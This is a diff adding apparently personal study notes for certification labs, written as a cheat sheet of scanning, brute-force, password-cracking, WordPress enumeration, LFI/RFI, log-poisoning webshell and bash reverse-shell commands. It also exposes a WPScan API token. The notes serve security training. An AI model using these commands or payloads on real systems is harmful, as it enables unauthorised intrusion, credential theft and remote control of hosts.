@@ -1,0 +1,152 @@
+SCANNING NETWORK
+nmap -PR -sn 192.168.1.0/24
+nmap -sP 192.168.1.0/24
+nmap -sC -sV -p- -A -O -T4-v 192.168.1.0/24
+nmap -sU -PU 172.16.0.0/24 3 HOST ALIVE
+
+ENUMERATION
+nmap -sC -p21 192.168.0.117
+ftp 10.10.1.11 
+FTP HYDRA
+hydra -L /usr/share/wordlist/metasploit/unix_user.txt -P /usr/share/wordlist/metasploit/unix_password.txt 10.10.0.11 ftp
+
+SNMP
+*** locate *.nse |grep "snmp"
+
+nmap -sU -p161,162 10.10.1.19
+snmp-check 10.10.1.11
+
+-see processes
+nmap -sU -p161,162 --script=snmp-processes 10.10.1.19
+
+all script for snmp
+nmap -sU -p161,162 --script="snmp-*" 10.10.1.19
+
+--with msfconsole
+search snmp/snmp
+use auxiliary/scanner/snmp/snmp_login
+show options
+set RHOSTS 10.10.1.19
+set THREADS 20
+exploit
+
+
+SMB - SERVER MESSAGE BLOCK
+nmap -p445 10.10.1.0/24
+nmap -p445 --script=smb-enum-shares 10.10.1.0/24
+nmap -p445 --script=smb-enum-users --script-args smbusername=administrator,smbpassword=Pa$$w0rd 10.10.1.11
+nmap -p445 --script=smb-enum-groups --script-args smbusername=administrator,smbpassword=Pa$$w0rd 10.10.1.11
+nmap -sC -sV -A -T4 -p445 10.10.1.11
+nmap -p445 --script=smb-enum-services --script-args smbusername=administrator,smbpassword=Pa$$w0rd 10.10.1.11
+
+RDP
+verificar puertos remote desktop 3389
+nmap 10.10.1.0/24
+
+confirmar en msfconsole
+search rdp/
+use auxiliary/scanner/rdp/rdp_scanner
+set RHOSTS 10.10.1.11
+set THREADS 20
+usar hydra para conseguir user and pass
+conectarse
+xfreerdp /u:Administrator /p:Pa$$w0rd /v:10.10.1.19:3389
+rdesktop -u Administrator -p Pa$$w0rd 10.10.1.19:3389
+
+-oA
+xsltproc ./resultado.xml -o ./resultado.html
+
+NETBIOS
+
+*JOHN THE REAPER
+john SMB-NTLVMv2.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+
+*HYDRA - HIGHLIGHTS
+HTTP FORM POST LOGIN
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.110.47 http-post-form "/login:username=^USER^&password=^PASS^:F=Incorrect" -V
+
+SSH LOGIN
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.110.47 -t 4 ssh -V
+
+*HASH IDENTIFIER
+https://hashes.com/es/tools/hash_identifier
+hash-identifier #HASH#
+hashcat -m 0 -a 0 hash.txt /usr/share/wordlist/rockyou.txt md5
+hashcat -m 1000 -a 0 123.txt /usr/share/wordlists/rockyou.txt NLTM
+
+*WPSCAN WORDPRESS AND METASPLOIT
+Task 6: Enumerate and Hack a Web Application using WPScan and Metasploit
+
+wpscan --api-token ZheELLLfv3bEJHm2DEqxDChlKsziLh2C2M5WIyAXNaY --url http://10.10.1.22:8080/CEH --plugins-detection aggressive --enumerate vp  (vulnerable plugins)
+
+wpscan --api-token ZheELLLfv3bEJHm2DEqxDChlKsziLh2C2M5WIyAXNaY --url http://10.10.1.22:8080/CEH --plugins-detection aggressive --enumerate u  (user)
+
+wpscan --api-token ZheELLLfv3bEJHm2DEqxDChlKsziLh2C2M5WIyAXNaY --url http://10.10.1.22:8080/CEH --plugins-detection aggressive --enumerate dbe  (db export)
+
+BRUTE FORCE LOGIN
+service postgresql start
+use auxiliary/scanner/http/wordpress_login_enum
+
+PASS_FILE: Sets the password.txt file, using which; you will perform the dictionary attack
+RHOST: Sets the target machine 10.10.1.22
+RPORT: Sets the target machine porT 8080
+TARGETURI: Sets the base path to the WordPress website (here, http://10.10.1.22:8080/CEH]
+USERNAME: Sets the username that was obtained with WPSCAN. (admin,cehuser1,cehuser2)
+
+
+*XSS Vulnerabilities in Web Applications using PwnXSS
+python3 pwnxss.py -u http://testphp.vulnweb.com
+
+*STEGHIDE - OPEN STEGO - SNOW
+steghide --embed -ef secret.txt -cf origen_imagen.jpeg -sf imagen_and_secret.jpeg -p 12345
+steghide --extrack -sf imagen_and_secret.jpeg -p 12345
+
+stegsnow -C -m "frase oculta" -p "elpassword" fileoriginal.txt filesalida.txt
+stegsnow -C -p "elpassword" filesalida.txt
+
+
+ENCONTRAR SUBDOMINIOS
+httprobe
+
+
+descomprimir rockyou.gz
+gzip -d rockyou.gz
+
+DVWA LFI 
+lfi wrappers
+page=/etc/passwd
+page=http://google.com
+page=htTp://google.com
+page=../../../../..//etc/hosts
+page=file:///etc/passwd
+page=/var/log/apache2/access.log
+
+RFI
+HackTool add firefox
+revshells.com
+page=/var/log/apache2/access.log
+
+nc localhost 80
+GET /<?php system($_GET['cmd']); ?>
+page=/var/log/apache2/access.log&cmd=ls
+page=/var/log/apache2/access.log&cmd=cat /etc/password
+CRTL+U
+REVERSE SHELL
+nc -nlvp 555
+bash -c "/bin/bash -i >& /dev/tcp/10.0.0.15/555 0>&1"
+urlencoder.io
+
+page=/var/log/apache2/access.log&cmd=bash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.15%2F53%200%3E%261%22
+
+curl http://localhost/ -A "<?php passthru(\$_GET['cmd']); ?>"
+locate webshells
+php-reverse-shell.php
+(modificar ip atacante y puerto)
+mv php-reverse-shell.php shell.txt
+python3 -m http.server 8080
+nc -nlvp 555
+localhost/vulnerabilities/fi/?page=http://10.10.0.15:8080/shell.txt
+
+NIKTO
+nikto -h http://movies.cehorg.com
